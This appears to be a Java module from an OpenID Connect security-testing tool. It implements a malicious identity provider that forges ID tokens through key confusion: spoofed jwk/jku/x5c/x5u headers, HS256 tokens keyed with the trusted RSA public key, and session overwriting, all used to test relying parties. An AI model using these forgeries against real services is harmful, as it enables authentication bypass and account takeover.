package de.rub.nds.oidc.server.op;

import com.google.common.base.Strings;
import com.nimbusds.jose.*;
import com.nimbusds.jose.crypto.MACSigner;
import com.nimbusds.jose.crypto.RSASSASigner;
import com.nimbusds.jose.jwk.JWK;
import com.nimbusds.jose.jwk.JWKSet;
import com.nimbusds.jose.jwk.RSAKey;
import com.nimbusds.jose.jwk.gen.OctetSequenceKeyGenerator;
import com.nimbusds.jose.util.Base64;
import com.nimbusds.jose.util.Base64URL;
import com.nimbusds.jwt.JWT;
import com.nimbusds.jwt.JWTClaimsSet;
import com.nimbusds.jwt.SignedJWT;
import com.nimbusds.oauth2.sdk.ParseException;
import com.nimbusds.oauth2.sdk.http.HTTPRequest;
import com.nimbusds.oauth2.sdk.http.ServletUtils;
import com.nimbusds.oauth2.sdk.id.ClientID;
import com.nimbusds.openid.connect.sdk.Nonce;
import com.nimbusds.openid.connect.sdk.claims.AccessTokenHash;
import com.nimbusds.openid.connect.sdk.claims.CodeHash;
import com.nimbusds.openid.connect.sdk.op.OIDCProviderMetadata;
import com.nimbusds.openid.connect.sdk.rp.OIDCClientInformation;
import de.rub.nds.oidc.server.RequestPath;
import de.rub.nds.oidc.utils.KeyConfusionHelper;
import de.rub.nds.oidc.utils.KeyConfusionPayloadType;
import net.minidev.json.JSONArray;
import net.minidev.json.JSONObject;
import org.apache.commons.lang3.RandomStringUtils;

import javax.annotation.Nonnull;
import javax.annotation.Nullable;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.ws.rs.core.UriBuilder;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.URI;
import java.security.GeneralSecurityException;
import java.security.KeyStore;
import java.security.PublicKey;
import java.security.cert.CertificateEncodingException;
import java.util.*;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.TimeoutException;

import static de.rub.nds.oidc.server.op.OPParameterConstants.*;

// TODO: didscovery must announce all algorithms used for signing in any testcase (EC, RSA, HS)

public class KeyConfusionOP extends DefaultOP {
	//    private int requestCount = 0;
	private URI untrustedKeyUri;
	private String untrustedKeyResponseString;
//    private CompletableFuture<?> waitForHonest;

	@Override
	protected JWT getIdToken(@Nonnull ClientID clientId, @Nullable Nonce nonce, @Nullable AccessTokenHash atHash,
							 @Nullable CodeHash cHash) throws GeneralSecurityException, JOSEException, ParseException {

		// TODO: use a URI on a different domain, completely unrelated to the OP - would require huge refactoring
		untrustedKeyUri = UriBuilder.fromUri(baseUri).path(this.UNTRUSTED_KEY_PATH).build();

		JWTClaimsSet claims = getIdTokenClaims(clientId, nonce, atHash, cHash);
		SignedJWT signedJwt;
		if (params.getBool(FORCE_REGISTER_HONEST_CLIENTID)) {
			// keyConfusion 6 (KC w/ SessionOverwriting)
			signedJwt = sessionOverwritingKeyConfusion(claims);
		} else {
			signedJwt = getKeyConfusionJWT(claims);
		}


		// store keyresponse in context
		//stepCtx.put(OPContextConstants.UNTRUSTED_KEY_RESPONSE, untrustedKeyResponseString);

		// TODO: add default case to make sure signedJwt is never null
		Base64 header = new Base64(signedJwt.serialize().split("\\.")[0]);
		logger.logCodeBlock(header.decodeToString(), "Generated id_token header:");
//        logger.log("generated id_token body:\n" + signedJwt.getPayload().toString());

		return signedJwt;
	}

	@Override
	public void authRequest(RequestPath path, HttpServletRequest req, HttpServletResponse resp) throws IOException {
		if (!Boolean.parseBoolean((String) stepCtx.get(FORCE_REGISTER_HONEST_CLIENTID))) {
			// all KC tests except KC6
			super.authRequest(path, req, resp);
			return;
		}
		// KeyConfusion with Session Overwriting
		try {
			if (type == OPType.HONEST) {
				// second Authentication Request
				logger.log("Authentication requested at Honest OP.");
				HTTPRequest reqMsg = ServletUtils.createHTTPRequest(req);
				logger.logHttpRequest(req, reqMsg.getQuery());

				CompletableFuture<?> releaseEvil = (CompletableFuture<?>) stepCtx.get(OPContextConstants.BLOCK_OP_FUTURE);
				releaseEvil.complete(null);

				resp.setStatus(204);
				resp.flushBuffer();
			} else {
				// first Authentication Request
				CompletableFuture<?> waitForHonest = (CompletableFuture<?>) stepCtx.get(OPContextConstants.BLOCK_OP_FUTURE);

				logger.log("Authentication requested at Evil OP.");
				HTTPRequest reqMsg = ServletUtils.createHTTPRequest(req);
				logger.logHttpRequest(req, reqMsg.getQuery());
//                AuthenticationRequest authReq = AuthenticationRequest.parse(reqMsg);

				// release browser
				CompletableFuture<?> browserBlocker = (CompletableFuture<?>) stepCtx.get(OPContextConstants.BLOCK_BROWSER_FUTURE);
				browserBlocker.complete(null);

				// wait until second Authentication Request was received in honest op
				waitForHonest.get(25, TimeUnit.SECONDS);

				// send response using default OP implementation
				logger.log("Releasing AuthResponse from Evil OP");
				super.authRequest(path, req, resp);
			}
		} catch (InterruptedException ex) {
			logger.log("Waiting for client to discover evil OP was interrupted.", ex);
		} catch (ExecutionException | TimeoutException ex) {
			logger.log("Waiting for client to discover evil failed.", ex);
		}
	}

	/**
	 * A Request to the untrustedKey location indicates that the client processed a URI received in the ID Token)
	 */
	@Override
	public void untrustedKeyRequest(RequestPath path, HttpServletRequest req, HttpServletResponse resp) throws IOException {

		// mark as SSRF vuln as requested URL was delivered to RP via id_token
		// (even through the frontchannel if implicit flow)
		// TODO: only FAIL here if (implict || hybrid) flow is used?
		stepCtx.put(OPContextConstants.UNTRUSTED_KEY_REQUESTED, true);

		logger.log("Untrusted key requested");
		logger.logHttpRequest(req, null);

//        String jsonString = (String) stepCtx.get(OPContextConstants.UNTRUSTED_KEY_RESPONSE);
//        untrustedKeyResponseString = Strings.isNullOrEmpty(jsonString) ? "{}" : jsonString;
		untrustedKeyResponseString = Strings.isNullOrEmpty(untrustedKeyResponseString) ? "{}" : untrustedKeyResponseString;

		resp.getWriter().write(untrustedKeyResponseString);
		resp.setContentType("application/json; charset=UTF-8");
		resp.flushBuffer();
		logger.logHttpResponse(resp, untrustedKeyResponseString);
	}

	// Make sure the required ID Token signing algorithms are included in the discovery response
	// only effective if registration is enforced using the TestParameter
	//		<Parameter Key="dynamic_client_registration_support_needed">true</Parameter>
	@Override
	public void providerConfiguration(RequestPath path, HttpServletRequest req, HttpServletResponse resp) throws IOException {
		logger.log("Provider configuration requested.");
		logger.logHttpRequest(req, null);
		try {
			OIDCProviderMetadata md = getDefaultOPMetadata();
			// override default JWS algorithsm for ID Token signing
			md.setIDTokenJWSAlgs(getOPMetadataJWSAlgs()); // TODO: double check that htis override works as intended

			String mdStr = md.toJSONObject().toString();
			resp.setContentType("application/json");
			resp.getWriter().write(mdStr);
			resp.flushBuffer();
			logger.log("Returning default provider config.");
			logger.logHttpResponse(resp, mdStr);
		} catch (IOException | ParseException ex) {
			logger.log("Failed to process provider config.", ex);
			resp.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
			resp.flushBuffer();
			logger.logHttpResponse(resp, null);
		}
	}

	private List<JWSAlgorithm> getOPMetadataJWSAlgs() {
		List<JWSAlgorithm> algs = new ArrayList<>();
		if (params.getBool(OPParameterConstants.OP_MD_JWSA_HS256)) {
			algs.add(JWSAlgorithm.HS256);
		}
		if (params.getBool(OPParameterConstants.OP_MD_JWSA_RS256)) {
			algs.add(JWSAlgorithm.RS256);
		}
		if (params.getBool(OPParameterConstants.OP_MD_JWSA_NONE)) {
			algs.add(JWSAlgorithm.parse("none"));
		}

		// default
		if (algs.isEmpty()) {
			algs = Arrays.asList(JWSAlgorithm.RS256, JWSAlgorithm.parse("none"));
		}
		return algs;
	}

	/**
	 * Generate an ID Token signed with a key unknown to the client. Depending on the OP Configuration,
	 * various JWT Header fields lure the client to use the signing key included in the ID Token or to request
	 * the key from an untrustworthy URL (which has not been announced during Discovery but is included in the token)
	 */
	private SignedJWT getKeyConfusionJWT(JWTClaimsSet claims) throws JOSEException, CertificateEncodingException, ParseException {
		// A Key that is unknown to the client
		KeyStore.PrivateKeyEntry untrustedEntry = opivCfg.getUntrustedSigningEntry();
		RSAKey key = getSigningJwk(untrustedEntry);

		// the key thats also returned from the benign/trusted JWKS Url
		JWK trustedKey = getSigningJwk(opivCfg.getEvilOPSigningEntry()).toPublicJWK();

		// default signing algorithm
		String algorithm = "RS256";

		JSONObject jsonHeader = new JSONObject();
		// "typ" header parameter is optional acc. to RFC7519, Section 5.1
		jsonHeader.put("typ", "JWT");

		if (params.getBool(FORCE_NEW_KID_IN_IDTOKEN_AND_JWK)) {
			// add a kid that is unkown to the client to JWT header, JWK, and the JWKS served from untrustedKeyUri
			String randomKeyID = RandomStringUtils.randomAlphanumeric(12);
			jsonHeader.put("kid", randomKeyID);

			RSAKey newKey = new RSAKey.Builder(key).keyID(randomKeyID).build();
			key = newKey;
		}

		// jwk KeyConfusion - the signing key is included in the token's jwk member
		if (params.getBool(IDTOKEN_SPOOFED_JWK)) {
			JSONObject tmpKey = key.toPublicJWK().toJSONObject();
			tmpKey.remove("x5c"); // is added, when INCLUDE_SIGNING_CERT is set in test spec
//			jsonHeader.put("jwk", key.toPublicJWK());
			jsonHeader.put("jwk", tmpKey);
			jsonHeader.putIfAbsent("alg", algorithm);
		} else if (params.getBool(IDTOKEN_SPOOFED_JKU_AS_JWK)) {
			jsonHeader.put("jwk", untrustedKeyUri.toString());
			jsonHeader.putIfAbsent("alg", algorithm);
			untrustedKeyResponseString = new JWKSet(key.toPublicJWK()).toString();
		}

		// x5c KeyConfusion - the signin key is included in the token's x5c member
		if (params.getBool(IDTOKEN_SPOOFED_X5C)) {
			jsonHeader.putIfAbsent("alg", algorithm);
			ArrayList<Base64> list = new ArrayList<>();
			Base64 untrustedCert = Base64.encode(untrustedEntry.getCertificate().getEncoded());
			Base64 trustedCert = Base64.encode(opivCfg.getEvilOPSigningEntry().getCertificate().getEncoded());

			if (params.getBool(X5C_UNTRUSTED_FIRST)) {
				// untrusted cert first, trusted second
				list.add(untrustedCert);
				list.add(trustedCert);
			} else if (params.getBool(X5C_TRUSTED_FIRST)) {
				// trusted first, untrusted second
				list.add(trustedCert);
				list.add(untrustedCert);
			} else {
				list.add(untrustedCert);
			}

			if (!list.isEmpty()) {
				JSONArray arr = new JSONArray();
				arr.addAll(list);
				jsonHeader.put("x5c", arr);
			}
		}

		// JKU points to unknown URI which returns JWK used to sign the ID Token
		if (params.getBool(IDTOKEN_SPOOFED_JKU)) {
			jsonHeader.putIfAbsent("alg", algorithm);
			jsonHeader.put("jku", untrustedKeyUri.toString());

			// prepare response to a request of the untrustedKeyUri
			ArrayList<JWK> keySet = new ArrayList<>();
			if (params.getBool(JKU_TRUSTED_FIRST)) {
				// jwks URI returns [trusted, untrusted]
				// i.e., the hosted jwks contains both the untrusted key (used for signing) and the trusted key (as served on discovery endpoint)
				keySet.add(trustedKey);
				keySet.add(key.toPublicJWK());
			} else if (params.getBool(JKU_UNTRUSTED_FIRST)) {
				// jwks returns [untrusted, trusted]
				// the hosted jwks contains both the untrusted key and the trusted (as served on discovery endpoint)
				keySet.add(key.toPublicJWK());
				keySet.add(trustedKey);
			} else {
				// only serve the untrusted key that is used to sign the JWT
				keySet.add(key);
			}
			JWKSet jwkSet = new JWKSet(keySet);
			untrustedKeyResponseString = jwkSet.toString();
		} else if (params.getBool(IDTOKEN_SPOOFED_X5U)) {
			// x5u points to unknown URI that responds with the x509 cert corresponding to the signing key
			jsonHeader.putIfAbsent("alg", algorithm);
			jsonHeader.put("x5u", untrustedKeyUri.toString());

			// TODO test this, should be a x509 cert, not json
			untrustedKeyResponseString = untrustedEntry.getCertificate().toString();
		}

		/* *********************************** */
		/* Speculative / experimental  tests */

		// invalid kid field values (URI or JWK)
		if (params.getBool(IDTOKEN_SPOOFED_JKU_AS_KID)) {
			jsonHeader.putIfAbsent("alg", algorithm);

			jsonHeader.appendField("kid", untrustedKeyUri.toString());
			JWKSet jwkSet = new JWKSet(key.toPublicJWK());
			untrustedKeyResponseString = jwkSet.toString();
		}
		if (params.getBool(IDTOKEN_SPOOFED_JWK_AS_KID)) {
			jsonHeader.putIfAbsent("alg", algorithm);

			jsonHeader.appendField("kid", key.toPublicJWK());
			JWKSet jwkSet = new JWKSet(key.toPublicJWK());
			untrustedKeyResponseString = jwkSet.toString();
		}

		// invalid jwk field that points to a untrusted JKU, i.e., {..., jwk: {jku:untrustedURI, ...}}
		if (params.getBool(IDTOKEN_SPOOFED_JKU_IN_JWK)) {
			jsonHeader.putIfAbsent("alg", algorithm);

			JSONObject jwk = key.toPublicJWK().toJSONObject();
			jwk.remove("jku");
			jwk.put("jku", untrustedKeyUri.toString());
			jsonHeader.remove("jwk");
			jsonHeader.put("jwk", jwk);

			JWKSet jwkSet = new JWKSet(key.toPublicJWK());
			untrustedKeyResponseString = jwkSet.toString();
		}
		/* *********************************** */

		// set "crit" field, may urge some clients to process the spoofed fields
		Set<String> criticalParams = new HashSet<>();
		if (params.getBool(IDTOKEN_CRITICAL_JKU)) {
			criticalParams.add("jku");
		}
		if (params.getBool(IDTOKEN_CRITICAL_JWK)) {
			criticalParams.add("jwk");
		}
		if (params.getBool(IDTOKEN_CRITICAL_X5C)) {
			criticalParams.add("x5c");
		}
		if (params.getBool(IDTOKEN_CRITICAL_KID)) {
			criticalParams.add("kid");
		}
		if (params.getBool(IDTOKEN_CRITICAL_X5U)) {
			criticalParams.add("x5u");
		}
		if (!criticalParams.isEmpty()) {
			JSONArray arr = new JSONArray();
			criticalParams.stream().forEach(e -> arr.appendElement(e));
			jsonHeader.put("crit", arr);
		}

		// actual RSA signing of the JWT (only if jsonHeader has been marked with alg:RS256)
		if (jsonHeader.getOrDefault("alg", null) == "RS256") {
			JWSHeader header = new JWSHeader.Builder(JWSAlgorithm.RS256)
					// note: using .parsedBase64URL() can override the JWSAlgorithm set in the Builder's constructor
					.parsedBase64URL(Base64URL.encode(jsonHeader.toJSONString())).build();
			SignedJWT signedJwt = new SignedJWT(header, claims);
			JWSSigner signer = new RSASSASigner(key);
			signedJwt.sign(signer);

			return signedJwt;
		}
		/* end RSA KeyConfusion */
		/************************/

		/************************************/
		/* HMAC based key confusion attacks */

		// make sure we use the correct "alg"
		jsonHeader.remove("alg");
		algorithm = "HS256";
		byte[] macKey = {0x00};
		JSONObject trustedJwkJSON = trustedKey.toPublicJWK().toJSONObject();

		if (params.getBool(IDTOKEN_SPOOFED_SECRET_KEY_)) {
			// include HMAC key in jwk parameter of ID Token
			jsonHeader.putIfAbsent("alg", algorithm);
			JSONObject octJwk = new OctetSequenceKeyGenerator(256).generate().toJSONObject();

			if (jsonHeader.containsKey("kid")) {
				// enforced due to OP param FORCE_NEW_KID_IN_IDTOKEN_AND_JWK
				octJwk.put("kid", jsonHeader.get("kid"));
			}
			jsonHeader.put("jwk", octJwk);
			// the JWKs k member needs Base64URL decoding
			macKey = org.apache.commons.codec.binary.Base64.decodeBase64(octJwk.getAsString("k"));
		}

		// using (parts of) trusted Public RSAKey as HMAC Key
		// RS256 is announced in OP Configuration responses, HS256 is mandatory for clients
		if (params.getBool(IDTOKEN_HMAC_PUBKEY_e)) {
			macKey = trustedJwkJSON.getAsString("e").getBytes();
			jsonHeader.putIfAbsent("alg", algorithm);
		} else if (params.getBool(IDTOKEN_HMAC_PUBKEY_alg)) {
			macKey = trustedJwkJSON.getAsString("alg").getBytes();
			jsonHeader.putIfAbsent("alg", algorithm);
		} else if (params.getBool(IDTOKEN_HMAC_PUBKEY_kty)) {
			macKey = trustedJwkJSON.getAsString("kty").getBytes();
			jsonHeader.putIfAbsent("alg", algorithm);
		} else if (params.getBool(IDTOKEN_HMAC_PUBKKEY_n)) {
			macKey = trustedJwkJSON.getAsString("n").getBytes();
			jsonHeader.putIfAbsent("alg", algorithm);
		} else if (params.getBool(IDTOKEN_HMAC_PUBKEY_JWKSTRING)) {
			macKey = trustedJwkJSON.toString().getBytes();
			jsonHeader.putIfAbsent("alg", algorithm);
			// TODO: add a variant without JSON string escaping like "/" => "\/" ?
		}

		// make sure the trusted signing key returned from the trusted JWKS Endpoint includes the same kid
		// (only works if new discovery/registration is enforced)
		if (jsonHeader.containsKey("kid")) {
			// TODO: the jwks could have been requested and cached during discovery
			// in which case the kid stored here would not be used...
			stepCtx.put(OPContextConstants.SIGNING_JWK_KEYID, jsonHeader.getAsString("kid"));
		}

		PublicKey publicKey = ((RSAKey) trustedKey).toPublicKey();
		if (params.getBool(IDTOKEN_HMAC_PUBKEY_PKCS1)) {
			String pkcs1KeyString = KeyConfusionHelper.convertPKCS8toPKCS1PemString(publicKey);
			if (pkcs1KeyString == null) {
				logger.log("Key conversion failed");
				throw new ParseException("Error converting JWK to PEM");
			}
			String payloadType = params.get(P1_KEY_CONFUSION_PAYLOAD_TYPE);
			try {
				macKey = KeyConfusionHelper.transformKeyByPayload(KeyConfusionPayloadType.valueOf(payloadType),
						pkcs1KeyString).getBytes();
			} catch (IllegalArgumentException e) {
				logger.log("Unknown Payload type " + payloadType);
				throw new ParseException("Error converting JWK to PEM");
			}
			jsonHeader.putIfAbsent("alg", algorithm);

		} else if (params.getBool(IDTOKEN_HMAC_PUBKEY_PKCS8)) {
			String payloadType = params.get(P8_KEY_CONFUSION_PAYLOAD_TYPE);
			try {
				macKey = KeyConfusionHelper.transformKeyByPayload(KeyConfusionPayloadType.valueOf(payloadType),
						publicKey).getBytes();
			} catch (IllegalArgumentException | UnsupportedEncodingException e) {
				logger.log("Unknown Payload type or unsupported key encoding");
				throw new ParseException(e.getMessage());
			}
			jsonHeader.putIfAbsent("alg", algorithm);

		}

		// actual "signing"
//		logger.log("Using MAC key: " + macKey);
//		logger.log("Using MAC key bytes: " + Arrays.toString(macKey));
		// TODO: make sure macKey has been set (!= 0x00)

		JWSHeader header = new JWSHeader.Builder(JWSAlgorithm.HS256)
				.parsedBase64URL(Base64URL.encode(jsonHeader.toJSONString())).build();

		if (macKey.length < 32) {
			// TODO: as per RFC7520, Section 3.5, keys should be left-padded with
			// leading zeros to reach the min length of 32 bytes for HS256.
			// Maybe add as a further variant?
			String part1 = Base64URL.encode(header.toString()).toString();
			String part2 = Base64URL.encode(claims.toString()).toString();
			String parts = part1 + "." + part2;
			try {
				byte[] mac = KeyConfusionHelper.generateMac("HmacSHA256", macKey, parts.getBytes());
//				logger.log("parts used: " + parts);
//				logger.log("mac computed: " + Base64URL.encode(mac).toString());
//				logger.log("mac bytes: " + Arrays.toString(mac));
				return new SignedJWT(Base64URL.encode(header.toString()), Base64URL.encode(claims.toString()), Base64URL.encode(mac));
			} catch (java.text.ParseException e) {
				logger.log("Mac generation failed");
				throw new ParseException(e.getMessage());
			}
		}

		SignedJWT signedJWT = new SignedJWT(header, claims);

		JWSSigner signer = new MACSigner(macKey);
		signedJWT.sign(signer);

		return signedJWT;
	}

	/**
	 * KeyConfusion with SessionOverwriting
	 */
	private SignedJWT sessionOverwritingKeyConfusion(JWTClaimsSet claims) throws GeneralSecurityException {
		// replace client ID (use same ID for evil and honest
		OIDCClientInformation cinfo = getRegisteredClientInfo(); //(OIDCClientInformation) stepCtx.get(OPContextConstants.REGISTERED_CLIENT_INFO_EVIL);
		logger.logCodeBlock(cinfo.toString(), "Generating HS256 using client_secret from stored ClientInfo:");

		JWSHeader.Builder hb = new JWSHeader.Builder(JWSAlgorithm.HS256).type(JOSEObjectType.JWT);
		JWSHeader header = hb.build();
		SignedJWT signedJwt = new SignedJWT(header, claims);

		try {
			byte[] key = cinfo.getSecret().getValueBytes();
			if (key == null) {
				logger.log("Error: client_secret not set.");
			}
			JWSSigner signer = new MACSigner(key);
			signedJwt.sign(signer);

			return signedJwt;
		} catch (JOSEException e) {
			throw new GeneralSecurityException(e);
		}
	}

}
